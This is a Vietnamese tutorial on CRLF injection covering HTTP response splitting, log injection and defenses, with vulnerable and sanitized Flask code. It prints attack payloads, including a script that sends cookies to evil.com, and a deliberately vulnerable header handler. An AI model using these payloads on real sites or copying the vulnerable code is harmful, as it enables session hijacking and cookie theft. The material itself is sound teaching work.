# CRLF Injection

> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-93 | **Nguồn**: PortSwigger, OWASP, CWE MITRE

## 🧱 Kiến thức Nền tảng

Giao thức HTTP sử dụng cặp ký tự **CRLF** (`\r\n` — Carriage Return + Line Feed, mã ASCII 13 và 10) làm ký tự phân tách giữa các header và giữa header với body trong HTTP response. Khi server gửi phản hồi cho client, cấu trúc luôn tuân theo quy tắc:

- Mỗi header kết thúc bằng `\r\n`
- Header và body phân tách bởi `\r\n\r\n` (một dòng trống)

Tương tự, hệ thống logging thường ghi mỗi sự kiện trên một dòng, phân tách bằng newline (`\n`). Nếu ứng dụng chèn dữ liệu người dùng trực tiếp vào HTTP header hoặc log file mà không loại bỏ ký tự CRLF, attacker có thể kiểm soát cấu trúc output.

Ví dụ một HTTP response bình thường:

```http
# Normal HTTP response structure
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Set-Cookie: session=abc123\r\n
\r\n
<html>...</html>
```

Trong web application, redirect thường lấy URL từ user input:

```python
# Normal redirect implementation in Flask
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def do_redirect():
    # User-supplied destination used in Location header
    dest = request.args.get('url', '/')
    return redirect(dest)
```

## 🔍 Mô tả lỗ hổng

CRLF Injection xảy ra khi attacker chèn ký tự `\r\n` vào dữ liệu đầu vào mà ứng dụng sử dụng để xây dựng HTTP response header hoặc ghi log. Hậu quả bao gồm:

- **HTTP Response Splitting**: Chèn header giả mạo hoặc thậm chí tạo response body hoàn toàn mới, dẫn đến XSS, cache poisoning.
- **Log Injection**: Chèn dòng log giả mạo, gây nhầm lẫn cho quản trị viên khi phân tích sự cố.
- **Header Injection**: Thêm các header độc hại như `Set-Cookie` để cố định phiên (session fixation).

## ⚔️ Cơ chế tấn công

**HTTP Response Splitting** — Attacker chèn CRLF vào tham số redirect để inject header mới:

```
# Attack URL — injecting Set-Cookie header via CRLF
https://victim.com/redirect?url=%0d%0aSet-Cookie:%20admin=true

# The server generates this malformed response:
HTTP/1.1 302 Found\r\n
Location: \r\n
Set-Cookie: admin=true\r\n        <-- Injected header!
\r\n
```

**Log Injection** — Attacker chèn newline để tạo log entry giả:

```
# Malicious username input for log injection
username = "admin\nINFO: Login successful for user admin from 10.0.0.1"

# Log file now shows fake entry:
# WARN: Failed login for user admin
# INFO: Login successful for user admin from 10.0.0.1
```

**Full Response Splitting** — Chèn cả body HTML mới chứa JavaScript:

```
# Injecting a complete fake response with XSS payload
url=%0d%0a%0d%0a<script>document.location='https://evil.com/?c='+document.cookie</script>
```

## 🛡️ Biện pháp phòng thủ

1. **Loại bỏ hoặc encode ký tự CRLF**: Strip tất cả `\r` và `\n` khỏi input trước khi sử dụng trong header hoặc log.
2. **Sử dụng framework hiện đại**: Hầu hết framework mới (Django, Express, Spring) tự động reject header chứa CRLF.
3. **URL-encode output**: Khi chèn user input vào Location header, luôn encode đúng cách.
4. **Validate log input**: Thay thế newline bằng ký tự an toàn hoặc encode trước khi ghi log.
5. **WAF rules**: Cấu hình Web Application Firewall phát hiện pattern `%0d%0a` trong request.

## 💻 Code Example

```python
# === VULNERABLE CODE ===
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/set-language')
def set_language():
    lang = request.args.get('lang', 'en')
    response = make_response("Language set")
    # DANGER: User input directly injected into header
    response.headers['X-Language'] = lang
    return response
# Attack: /set-language?lang=en%0d%0aSet-Cookie:%20admin=true


# === SECURE CODE ===
import re
from flask import Flask, request, make_response

app = Flask(__name__)

ALLOWED_LANGS = {'en', 'vi', 'fr', 'de', 'ja'}

def sanitize_header_value(value):
    # Remove all CR and LF characters to prevent CRLF injection
    return re.sub(r'[\r\n]', '', value)

@app.route('/set-language')
def set_language():
    lang = request.args.get('lang', 'en')

    # Whitelist validation — best defense
    if lang not in ALLOWED_LANGS:
        lang = 'en'

    # Defense in depth — also strip CRLF characters
    safe_lang = sanitize_header_value(lang)

    response = make_response("Language set")
    response.headers['X-Language'] = safe_lang
    return response
```

## 📚 Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/request-smuggling/advanced/response-splitting
- OWASP: https://owasp.org/www-community/vulnerabilities/CRLF_Injection
- CWE: https://cwe.mitre.org/data/definitions/93.html
